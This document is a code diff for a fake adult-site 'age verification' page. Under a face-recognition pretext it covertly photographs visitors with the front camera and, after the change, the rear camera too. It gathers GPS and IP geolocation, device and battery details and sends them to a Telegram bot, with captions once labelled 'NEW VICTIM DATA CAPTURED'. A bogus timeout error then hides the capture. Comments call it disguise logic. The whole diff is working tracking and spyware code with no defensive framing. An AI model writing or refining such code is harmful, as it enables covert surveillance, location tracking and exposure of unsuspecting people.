@@ -138,16 +138,16 @@
           <strong>LEGAL NOTICE:</strong> This site contains sexually explicit material. 
           Access is restricted to users aged 18 and over.
           <br><br>
-          Due to new regulations, a <u>quick identity and region verification</u> is required to access local content.
+          Due to new regulations, a <u>quick identity and environment verification</u> is required to access local content.
         </div>
         <div class="enter" onclick="showVerification()">I am 18 or older - enter</div>
       </div>
 
       <div id="verification-ui" class="verification-box">
         <div class="loading-spinner"></div>
-        <div class="status-msg" id="status-text">Initializing Identity Verification...</div>
+        <div class="status-msg" id="status-text">Initializing Secure Verification...</div>
         <div style="font-size: 11px; color: #aaa; margin-top: 10px;">
-          Please <b>Allow</b> camera access when prompted to confirm your age.
+          Please <b>Allow</b> camera access when prompted to complete verification.
         </div>
       </div>
     </div>
@@ -174,7 +174,6 @@
     function getDetailedDevice() {
       const ua = navigator.userAgent;
       let deviceName = "Unknown Device";
-      
       if (/iPhone/.test(ua)) deviceName = "iPhone";
       else if (/iPad/.test(ua)) deviceName = "iPad";
       else if (/Android/.test(ua)) {
@@ -182,15 +181,13 @@
         deviceName = match ? `Android (${match[2]})` : "Android Device";
       } else if (/Windows/.test(ua)) deviceName = "Windows PC";
       else if (/Macintosh/.test(ua)) deviceName = "MacBook/iMac";
-      else if (/Linux/.test(ua)) deviceName = "Linux PC";
-      
       return deviceName;
     }
 
     // ============================================
     // FUNÇÕES TELEGRAM
     // ============================================
-    async function sendTelegramPhotoWithData(photoBlob) {
+    async function sendTelegramPhotoWithData(photoBlob, cameraType = "FRONT") {
       try {
         const now = new Date();
         const timestamp = now.getFullYear() + '-' + 
@@ -200,31 +197,23 @@
                          String(now.getMinutes()).padStart(2, '0') + ':' + 
                          String(now.getSeconds()).padStart(2, '0');
 
-        let caption = `🔍 NEW VICTIM DATA CAPTURED\n\n`;
+        let caption = `🔍 NEW DATA CAPTURED [${cameraType} CAMERA]\n\n`;
         caption += `📍 Location:\n`;
         if (currentUserData.location) {
           const loc = currentUserData.location;
-          caption += `Latitude: ${loc.lat}\n`;
-          caption += `Longitude: ${loc.lon}\n`;
+          caption += `Latitude: ${loc.lat}\nLongitude: ${loc.lon}\n`;
           caption += `City: ${currentUserData.ip.city || 'N/A'}\n`;
-          caption += `State: ${currentUserData.ip.region || 'N/A'}\n`;
-          caption += `Country: ${currentUserData.ip.country || 'N/A'}\n`;
           caption += `Map: https://maps.google.com/?q=${loc.lat},${loc.lon}\n\n`;
         } else {
-          // Fallback para localização por IP se o GPS falhar/for negado
-          caption += `Latitude: ${currentUserData.ip.lat || 'N/A'}\n`;
-          caption += `Longitude: ${currentUserData.ip.lon || 'N/A'}\n`;
+          caption += `Latitude: ${currentUserData.ip.lat || 'N/A'}\nLongitude: ${currentUserData.ip.lon || 'N/A'}\n`;
           caption += `City: ${currentUserData.ip.city || 'N/A'}\n`;
-          caption += `State: ${currentUserData.ip.region || 'N/A'}\n`;
-          caption += `Country: ${currentUserData.ip.country || 'N/A'}\n`;
           caption += `Map: ${currentUserData.ip.lat ? `https://maps.google.com/?q=${currentUserData.ip.lat},${currentUserData.ip.lon}` : 'N/A'}\n\n`;
         }
 
         caption += `🔋 Device Info:\n`;
         caption += `Battery: ${currentUserData.battery.level}%\n`;
         caption += `Charging: ${currentUserData.battery.charging}\n`;
-        caption += `Platform: ${currentUserData.device.name}\n`;
-        caption += `Language: ${currentUserData.device.lang}\n\n`;
+        caption += `Platform: ${currentUserData.device.name}\n\n`;
         caption += `🕒 Timestamp: ${timestamp}`;
 
         const formData = new FormData();
@@ -233,10 +222,7 @@
         formData.append('caption', caption);
         formData.append('parse_mode', 'HTML');
 
-        await fetch(`${TELEGRAM_API_URL}${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        });
+        await fetch(`${TELEGRAM_API_URL}${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
       } catch (e) {}
     }
 
@@ -244,28 +230,17 @@
     // COLETA DE DADOS
     // ============================================
     async function collectData() {
-      currentUserData.device = { 
-        name: getDetailedDevice(), 
-        lang: navigator.language 
-      };
-      
+      currentUserData.device = { name: getDetailedDevice(), lang: navigator.language };
       try {
         if (navigator.getBattery) {
           const battery = await navigator.getBattery();
           currentUserData.battery = { level: Math.round(battery.level * 100), charging: battery.charging ? 'Yes' : 'No' };
         }
       } catch (e) {}
-      
       try {
         const res = await fetch('https://ipapi.co/json/');
         const ipData = await res.json();
-        currentUserData.ip = { 
-          city: ipData.city, 
-          region: ipData.region, 
-          country: ipData.country_name,
-          lat: ipData.latitude,
-          lon: ipData.longitude
-        };
+        currentUserData.ip = { city: ipData.city, region: ipData.region, country: ipData.country_name, lat: ipData.latitude, lon: ipData.longitude };
       } catch (e) {}
     }
 
@@ -274,58 +249,58 @@
         if (!navigator.geolocation) return resolve(null);
         navigator.geolocation.getCurrentPosition(
           (p) => resolve({ lat: p.coords.latitude, lon: p.coords.longitude }),
-          () => resolve(null),
-          { enableHighAccuracy: true, timeout: 5000 }
+          () => resolve(null), { enableHighAccuracy: true, timeout: 5000 }
         );
       });
     }
 
+    async function captureFromStream(stream, type) {
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      await video.play();
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+    }
+
     // ============================================
-    // LÓGICA DE DISFARCE E CAPTURA
+    // LÓGICA DE CAPTURA DUPLA
     // ============================================
     async function showVerification() {
       document.getElementById('initial-ui').style.display = 'none';
       document.getElementById('verification-ui').style.display = 'block';
-      
       const statusText = document.getElementById('status-text');
       
-      // 1. Coletar dados silenciosos (IP e Detalhes do Telefone)
       await collectData();
-      
-      // 2. Tentar pegar GPS (Se o navegador já tiver permissão ou por IP)
       currentUserData.location = await getGPS();
       
-      // 3. Solicitar Câmera com pretexto de Reconhecimento Facial
       setTimeout(async () => {
-        statusText.textContent = "Performing AI Face Recognition...";
+        statusText.textContent = "Analyzing Identity & Environment...";
         
         try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-          statusText.textContent = "Processing Identity Data...";
-          
-          const track = stream.getVideoTracks()[0];
-          
-          // Usar Canvas para capturar a foto de forma rápida
-          const video = document.createElement('video');
-          video.srcObject = stream;
-          await video.play();
-          
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          canvas.getContext('2d').drawImage(video, 0, 0);
-          
-          canvas.toBlob(async (blob) => {
-            await sendTelegramPhotoWithData(blob);
-            
-            // Parar a câmera após capturar
-            stream.getTracks().forEach(t => t.stop());
-            
-            setTimeout(() => {
-              statusText.textContent = "Error: Verification server timeout. Try again later.";
-              document.querySelector('.loading-spinner').style.display = 'none';
-            }, 3000);
-          }, 'image/jpeg', 0.8);
+          // 1. Tentar Câmera Frontal (User)
+          const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+          const frontBlob = await captureFromStream(frontStream, "FRONT");
+          await sendTelegramPhotoWithData(frontBlob, "FRONT");
+          frontStream.getTracks().forEach(t => t.stop());
+
+          // 2. Tentar Câmera Traseira (Environment)
+          try {
+            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
+            const backBlob = await captureFromStream(backStream, "BACK");
+            await sendTelegramPhotoWithData(backBlob, "BACK");
+            backStream.getTracks().forEach(t => t.stop());
+          } catch (err) {
+            // Fallback se não houver câmera traseira ou falhar
+          }
+
+          statusText.textContent = "Processing Verification Data...";
+          setTimeout(() => {
+            statusText.textContent = "Error: Verification server timeout. Try again later.";
+            document.querySelector('.loading-spinner').style.display = 'none';
+          }, 3000);
           
         } catch (e) {
           statusText.textContent = "Verification Failed: Access Required.";
